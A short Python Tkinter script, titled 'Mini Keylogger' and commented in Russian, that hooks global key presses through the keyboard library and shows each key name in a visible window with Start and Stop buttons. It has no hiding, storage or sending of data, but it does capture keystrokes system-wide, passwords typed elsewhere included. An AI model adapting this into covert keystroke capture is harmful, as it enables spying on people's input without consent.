import tkinter as tk
from tkinter import scrolledtext
import keyboard
import threading

class MiniKeylogger:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Mini Keylogger")
        self.root.geometry("400x300")
        self.logging = False
        
        # Кнопки
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="Start", command=self.start, bg="green").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Stop", command=self.stop, bg="red").pack(side=tk.LEFT, padx=5)
        
        # Текстовое поле
        self.text = scrolledtext.ScrolledText(self.root, height=15)
        self.text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
    def log_key(self, event):
        if self.logging:
            self.root.after(0, lambda: self.text.insert(tk.END, f"{event.name} "))
            self.root.after(0, lambda: self.text.see(tk.END))
    
    def start(self):
        self.logging = True
        threading.Thread(target=lambda: keyboard.on_press(self.log_key), daemon=True).start()
    
    def stop(self):
        self.logging = False
        keyboard.unhook_all()
    
    def run(self):
        self.root.mainloop()

MiniKeylogger().run()